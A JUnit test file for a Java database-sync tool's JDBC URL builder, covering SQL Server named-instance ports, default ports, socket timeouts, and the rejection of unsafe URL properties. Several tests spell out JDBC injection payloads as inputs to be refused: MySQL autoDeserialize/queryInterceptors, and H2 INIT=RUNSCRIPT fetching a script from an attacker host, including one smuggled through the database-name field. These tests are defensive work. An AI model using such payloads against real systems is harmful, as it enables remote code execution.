package com.qqmu.jync.service.connection;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.Test;

import com.qqmu.jync.config.SyncProperties;
import com.qqmu.jync.model.DatabaseConfig;
import com.qqmu.jync.model.DatabaseType;

/**
 * A SQL Server named instance is addressed without a port: the driver asks the SQL Browser
 * which port the instance listens on. Pinning 1433 — the default instance's port — makes
 * every connection to a named instance time out, so a blank port has to stay blank in the
 * URL for SQL Server only. Every other preset keeps its usual default when the field is left
 * empty.
 */
class DataSourceManagerJdbcUrlTest {

    private final DataSourceManager manager =
            new DataSourceManager(null, null, new SyncProperties());

    private DatabaseConfig config(DatabaseType type, String host, Integer port) {
        DatabaseConfig c = new DatabaseConfig();
        c.setName("c");
        c.setType(type);
        c.setHost(host);
        c.setPort(port);
        c.setDatabaseName("db");
        return c;
    }

    @Test
    void sqlServerBlankPortOmitsThePortSoTheInstanceCanBeResolved() {
        DatabaseConfig c = config(DatabaseType.SQLSERVER, "172.16.0.10\\SQLEXPRESS", null);

        String url = manager.buildJdbcUrl(c);

        assertThat(url)
                .startsWith("jdbc:sqlserver://172.16.0.10\\SQLEXPRESS;databaseName=db;")
                .doesNotContain(":1433");
    }

    @Test
    void sqlServerBlankPortKeepsAnInstanceNameFromExtraParams() {
        DatabaseConfig c = config(DatabaseType.SQLSERVER, "172.16.0.10", null);
        c.setExtraParams("instanceName=SQLEXPRESS");

        String url = manager.buildJdbcUrl(c);

        assertThat(url)
                .contains("jdbc:sqlserver://172.16.0.10;databaseName=db;")
                .contains(";instanceName=SQLEXPRESS")
                .doesNotContain(":1433");
    }

    @Test
    void sqlServerExplicitPortIsStillPinned() {
        DatabaseConfig c = config(DatabaseType.SQLSERVER, "172.16.0.10", 1450);

        String url = manager.buildJdbcUrl(c);

        assertThat(url).contains("jdbc:sqlserver://172.16.0.10:1450;databaseName=db;");
    }

    @Test
    void otherPresetsStillUseTheirDefaultPortWhenTheFieldIsBlank() {
        assertThat(manager.buildJdbcUrl(config(DatabaseType.MYSQL, "h", null)))
                .startsWith("jdbc:mysql://h:3306/db");
        assertThat(manager.buildJdbcUrl(config(DatabaseType.ORACLE, "h", null)))
                .isEqualTo("jdbc:oracle:thin:@//h:1521/db");
    }

    // —— URL 属性注入:黑名单必须覆盖 customUrl 与模板插值,不只是 extraParams ——

    @Test
    void aCustomUrlCarryingADangerousPropertyIsRefused() {
        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
        c.setCustomUrl("jdbc:mysql://h/db?autoDeserialize=true&queryInterceptors=x");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessage("error.connection.url.unsafe");
    }

    @Test
    void anH2InitRunscriptUrlIsRefused() {
        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
        c.setCustomUrl("jdbc:h2:mem:pwn;INIT=RUNSCRIPT FROM 'http://attacker/e.sql'");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.unsafe");
    }

    @Test
    void aDatabaseNameSmugglingAPropertyIsRefused() {
        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
        c.setDatabaseName("x;INIT=RUNSCRIPT FROM 'http://attacker/e.sql'");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.unsafe");
    }

    @Test
    void aConnectionPointingAtTheOwnMetadataStoreIsRefused() {
        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
        c.setCustomUrl("jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.selfMetadata");
    }

    @Test
    void anOrdinaryCustomUrlStillPasses() {
        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
        c.setCustomUrl("jdbc:mysql://h:3306/db?useSSL=false&serverTimezone=UTC");
        assertThat(manager.buildJdbcUrl(c)).contains("jdbc:mysql://h:3306/db");
    }

    @Test
    void aPercentEncodedDangerousKeyIsStillRefused() {
        // Connector/J URL-decodes query keys, so %61utoDeserialize becomes autoDeserialize.
        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
        c.setCustomUrl("jdbc:mysql://h/db?%61utoDeserialize=true");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.unsafe");
    }

    @Test
    void aLoopbackTcpUrlPointingAtTheOwnMetadataStoreIsRefused() {
        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
        DatabaseConfig c = config(DatabaseType.H2, "localhost", 9092);
        c.setDatabaseName("./data/jync");   // the H2 preset builds tcp://localhost:9092/./data/jync
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.selfMetadata");
    }

    @Test
    void aRemoteH2TcpConnectionIsNotMistakenForTheMetadataStore() {
        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
        DatabaseConfig c = config(DatabaseType.H2, "dbserver.example.com", 9092);
        c.setDatabaseName("./data/jync");
        assertThat(manager.buildJdbcUrl(c))
                .contains("jdbc:h2:tcp://dbserver.example.com:9092/");
    }

    @Test
    void anH2JavaObjectSerializerPropertyIsRefused() {
        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
        c.setCustomUrl("jdbc:h2:mem:x;JAVA_OBJECT_SERIALIZER=org.example.Evil");
        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
                .hasMessage("error.connection.url.unsafe");
    }

    @Test
    void aConfiguredSocketTimeoutIsAppendedPerDriver() {
        SyncProperties props = new SyncProperties();
        props.setJdbcSocketTimeoutMs(60_000);
        DataSourceManager m = new DataSourceManager(null, null, props);
        assertThat(m.buildJdbcUrl(config(DatabaseType.MYSQL, "h", 3306)))
                .contains("socketTimeout=60000");          // Connector/J milliseconds
        assertThat(m.buildJdbcUrl(config(DatabaseType.POSTGRESQL, "h", 5432)))
                .contains("socketTimeout=60");            // pgjdbc seconds
    }

    @Test
    void socketTimeoutIsOffByDefault() {
        assertThat(manager.buildJdbcUrl(config(DatabaseType.MYSQL, "h", 3306)))
                .doesNotContain("socketTimeout");
    }
}
